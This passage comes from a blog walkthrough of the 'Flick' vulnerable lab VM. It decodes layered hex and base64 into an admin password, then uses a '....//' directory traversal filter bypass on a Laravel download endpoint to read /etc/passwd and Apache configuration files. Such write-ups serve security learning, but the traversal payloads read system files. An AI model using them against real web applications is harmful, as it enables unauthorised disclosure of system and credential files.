</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>64<span class="se">\x</span>34<span class="se">\x</span>59<span class="se">\x</span>56<span class="se">\x</span>55<span class="se">\x</span>79<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>5a<span class="se">\x</span>58<span class="se">\x</span>57<span class="se">\x</span>48<span class="se">\x</span>42<span class="se">\x</span>58<span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>77
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>31<span class="se">\x</span>51<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>4e<span class="se">\x</span>56<span class="se">\x</span>62<span class="se">\x</span>45<span class="se">\x</span>4a<span class="se">\x</span>56<span class="se">\x</span>54<span class="se">\x</span>55<span class="se">\x</span>51<span class="se">\x</span>77<span class="se">\x</span>50<span class="se">\x</span>51<span class="se">\x</span>3d<span class="se">\x</span>3d
</span><span class='line'>
</span><span class='line'> .o88o. oooo   o8o            oooo
</span><span class='line'> <span class="m">888</span> <span class="sb">`</span><span class="s2">&quot; `888   `&quot;</span><span class="s1">&#39;            `888</span>
</span><span class='line'><span class="s1">o888oo   888  oooo   .ooooo.   888  oooo</span>
</span><span class='line'><span class="s1"> 888     888  `888  d88&#39;</span> <span class="sb">`</span><span class="err">&quot;</span>Y8  <span class="m">888</span> .8P<span class="s1">&#39;</span>
</span><span class='line'><span class="s1"> 888     888   888  888        888888.</span>
</span><span class='line'><span class="s1"> 888     888   888  888   .o8  888 `88b.</span>
</span><span class='line'><span class="s1">o888o   o888o o888o `Y8bod8P&#39;</span> o888o o888o
</span><span class='line'>
</span><span class='line'>blah@192.168.0.106<span class="err">&#39;</span>s password:
</span></code></pre></td></tr></table></div></figure>


<p>OK, that&rsquo;s something - I&rsquo;m intrigued to see what the hex decodes to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">echo</span> -e <span class="s2">&quot;\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34</span>
</span><span class='line'><span class="s2">&gt; \x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74</span>
</span><span class='line'><span class="s2">&gt; \x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68</span>
</span><span class='line'><span class="s2">&gt; \x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f</span>
</span><span class='line'><span class="s2">&gt; \x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73</span>
</span><span class='line'><span class="s2">&gt; \x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74</span>
</span><span class='line'>
</span><span class='line'><span class="s2">************************************** SNIP **************************************</span>
</span><span class='line'><span class="s2">&gt; \x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34</span>
</span><span class='line'><span class="s2">&gt; \x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58</span>
</span><span class='line'><span class="s2">&gt; \x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57</span>
</span><span class='line'><span class="s2">&gt; \x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36</span>
</span><span class='line'><span class="s2">&gt; \x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77</span>
</span><span class='line'><span class="s2">&gt; \x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d&quot;</span>
</span><span class='line'>Vm0wd2QyUXlVWGxWV0d4
</span><span class='line'>V1YwZDRWMVl3WkRSWFJt
</span><span class='line'>eFZVMjA1VjAxV2JETlhh
</span><span class='line'>Mk0xVmpKS1IySkVUbGho
</span><span class='line'>TVhCUVZteFZlRll5VGts
</span><span class='line'>alJtaG9UVmhDVVZacVFt
</span><span class='line'>RlpWMDE1VTJ0V1ZXSkhh
</span><span class='line'>
</span><span class='line'>******* SNIP *******
</span><span class='line'>V0ZkSGFGWlpiWGhoVm14
</span><span class='line'>c2NsZHJkR3BTYkZwNFZX
</span><span class='line'>MTBNRll4V25OalJXaFhW
</span><span class='line'>ak5TVEZsVVFYaFNWa3B6
</span><span class='line'>Vkd4YVUySkZXWHBXVlZw
</span><span class='line'><span class="nv">R1QxWkNVbEJVTUQwPQ</span><span class="o">==</span>
</span></code></pre></td></tr></table></div></figure>


<p>Oooh, base64 - this has to be the password !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">echo</span> <span class="s2">&quot;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==&quot;</span> <span class="p">|</span> base64 -d
</span><span class='line'><span class="nv">Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0</span><span class="o">=</span>
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>More base64&hellip; OK, decode again</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo</span> <span class="s2">&quot;Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=&quot;</span> <span class="p">|</span> base64 -d
</span><span class='line'><span class="nv">Vm0wd2QyUXlVWGxWV0d4WFlUSm9WMVl3Wkc5V2JGbDNXa1pPVlUxV2NIcFhhMXBQVjBaYWMySkVUbGhoTVVwVVZtcEdTMk15U2tWVWJHaG9UV3N3ZUZadGNFZFpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmJFcEpWbTEwYzJGV1NuUmhSemxWVmpOT00xcFZXbUZrUjA1R1UyMTRVMkpXU2twV2JURXdZekpHVjFOdVVtaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVsUkdXbGt3WkRSVk1rcFhVMnR3VjJKVVJYZFpWRVpyVTBaT2NtRkdXbWxTYTNCWFZtMTBWMlF5VW5OWGJHUllZbGhTV0ZSV1pGTmxiRmw1VFZSU1ZrMXJjRWxhU0hCSFZqSkZlVlZZWkZwbGEzQklWV3BHVDJSV1VuUmpSbEpUVmxoQ1dsWnJXbGRoTVZWNVZXeGthbEp0YUhOVmFrNVRWMVpXY1ZKcmRGUldiRm93V2xWb2ExWXdNVVZTYkdSYVRVWmFlbFpxU2t0V1ZrWlpZVVprVTFKWVFrbFdWM0JIVkRKU1YxZHVUbFJpVjNoVVZGY3hiMWRzV1hoYVJGSnBUV3RzTkZkclZtdFdiVXB5WTBac1dtSkdXbWhaTVZwelkyeGtkRkp0ZUZkaVZrbzFWbXBLTkZReFdsaFRiRnBZVmtWd1dGbHNhRU5YUmxweFVtdDBhazFyTlVsWlZWcHJZVWRGZUdOSGFGaGlSbkJvVmtSS1QyTXlUa1phUjJoVFRXNW9kbFpHVm05Uk1XUlhWMWhvV0dKWVVrOVZha1pIVGxaYVdFNVZPV2hXYXpWSFZqSjRVMWR0U2toaFJsSlhUVVp3VkZacVJtdGtWbkJHVGxaT2FWSnRPVE5XYTFwaFZURkZlRmRzYUZSaE1YQnhWV3hrYjFkR1VsaE9WVTVZVW14d2VGVnRkREJoYXpGeVRsVm9XbFpXY0hKWlZXUkdaV3hHY21KR1pGZFNWWEJ2VmpGYWExVXhXWGhVYmxaVllrWktjRlZxUmt0V1ZscEhWV3RLYTAxRVJsTlZSbEYzVUZFOVBRPT0</span><span class="o">=</span>
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://d2tq98mqfjyz2l.cloudfront.net/image_cache/1308021750174814.gif" alt="" /> Turns out you have to keep decoding the base64 about 13 more times until you end up with this</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">echo</span> <span class="s2">&quot;dGFidXBKaWV2YXM4S25vag==&quot;</span> <span class="p">|</span> base64 -d
</span><span class='line'>tabupJievas8Knoj
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Which just so happens to be the password for the application runnning on port 8881</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc 192.168.0.106 8881
</span><span class='line'>Welcome to the admin server. A correct password will <span class="s1">&#39;flick&#39;</span> the switch and open a new door:
</span><span class='line'>&gt; tabupJievas8Knoj
</span><span class='line'>OK: tabupJievas8Knoj
</span><span class='line'>
</span><span class='line'>Accepted! The door should be open now :poolparty:
</span><span class='line'>
</span><span class='line'>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Another NMAP scan now indicates that port 80 is open. Let us take a look.</p>

<hr />

<h2>The Internet is Made of Cats</h2>

<p>Looking at the site hosted by the website kinda stops me in my tracks. KITTENS !!! YAY !!!</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_001.png" alt="flick_001" /></a></p>

<p>You can log in with the credentials of demo:demo123 on the login page to give you the ability to upload images (note here, it allows you to upload absolutely anything).</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_002.png" alt="flick_002" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_003.png" alt="flick_003" /></a></p>

<p>I figured that the upload feature was the vulnerability and worked on uploading PHP shells etc, but I was not able to get any PHP to execute. Maybe it&rsquo;s not the <strong>up</strong>load feature that&rsquo;s useful, maybe it&rsquo;s the <strong>down</strong>load feature ? The download feature will present you with a file, called image.jpg, of the file you&rsquo;re requesting. Turns out you can request any file on the filesystem if you bypass the directory traversal filter (same way as with Hell, using &hellip;.// instead of ../). Requesting the following</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://192.168.0.106/image/download?filename<span class="o">=</span>....//....//....//....//....//etc/passwd
</span></code></pre></td></tr></table></div></figure>


<p>results in an &ldquo;image.jpg&rdquo; file which needs to be catted to view the contents of /etc/passwd as text.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# mv image.jpg flick_passwd
</span><span class='line'>root@pwk:~# cat flick_passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:105::/var/run/dbus:/bin/false
</span><span class='line'>whoopsie:x:103:106::/nonexistent:/bin/false
</span><span class='line'>landscape:x:104:109::/var/lib/landscape:/bin/false
</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
</span><span class='line'>mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>dean:x:1001:1001:,,,:/home/dean:/bin/bash
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Hmm, with this I can request pretty much anything, right ? If a folder or file exists, it gives me a download dialog, if the file does not exist, it gives me an error. This is blind filesystem traversal.</p>

<p><img src="http://media.tumblr.com/tumblr_lg3vooHJ7B1qac925.gif" alt="" /></p>

<p>Firstly I needed to find out the DocumentRoot from the Apache</p>

<p>So, I figured I wanted some credentials - and started by trying to get MySQL credentials from the application. A bit of googling determined that the application was <a href="http://getbootstrap.com/">Bootstrap</a> on top of <a href="https://github.com/laravel/laravel">Laravel</a>.  Firstly I requested the following URL to get the apache configuration.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://192.168.0.106/image/download?filename<span class="o">=</span>....//....//....//....//....//etc/apache2/apache.conf
</span></code></pre></td></tr></table></div></figure>


<p>which pointed me towards the sites-enabled folder. A bit of googling told me that sites-enabled is just full of symlinks to files in sites-available, so I grabbed the default file</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://192.168.0.106/image/download?filename<span class="o">=</span>....//....//....//....//....//etc/apache2/sites-available/default
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
</span><span class='line'>  ServerAdmin webmaster@localhost
</span><span class='line'>
</span><span class='line'>  DocumentRoot /var/www/flick_photos/public
</span><span class='line'>  <span class="nt">&lt;Directory</span> <span class="nt">/&gt;</span>
</span><span class='line'>      Options FollowSymLinks
</span><span class='line'>      AllowOverride None
</span><span class='line'>  <span class="nt">&lt;/Directory&gt;</span>
</span><span class='line'>  <span class="nt">&lt;Directory</span> <span class="err">/var/www/flick_photos/public</span><span class="nt">&gt;</span>
</span><span class='line'>      Options Indexes FollowSymLinks MultiViews
</span><span class='line'>      AllowOverride All
</span><span class='line'>      Order allow,deny
</span><span class='line'>      allow from all
</span><span class='line'>  <span class="nt">&lt;/Directory&gt;</span>
</span><span class='line'>
</span><span class='line'>  ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
</span><span class='line'>  <span class="nt">&lt;Directory</span> <span class="err">&quot;/usr/lib/cgi-bin&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      AllowOverride None
</span><span class='line'>      Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
</span><span class='line'>      Order allow,deny
</span><span class='line'>      Allow from all
</span><span class='line'>  <span class="nt">&lt;/Directory&gt;</span>
</span><span class='line'>
</span><span class='line'>  ErrorLog ${APACHE_LOG_DIR}/error.log
</span><span class='line'>
</span><span class='line'>  # Possible values include: debug, info, notice, warn, error, crit,
</span><span class='line'>  # alert, emerg.
</span><span class='line'>  LogLevel warn
</span><span class='line'>
</span><span class='line'>  CustomLog ${APACHE_LOG_DIR}/access.log combined
</span><span class='line'>
</span><span class='line'>    Alias /doc/ &quot;/usr/share/doc/&quot;
</span><span class='line'>    <span class="nt">&lt;Directory</span> <span class="err">&quot;/usr/share/doc/&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        Options Indexes MultiViews FollowSymLinks
</span><span class='line'>        AllowOverride None
</span><span class='line'>        Order deny,allow
</span><span class='line'>        Deny from all
</span><span class='line'>        Allow from 127.0.0.0/255.0.0.0 ::1/128
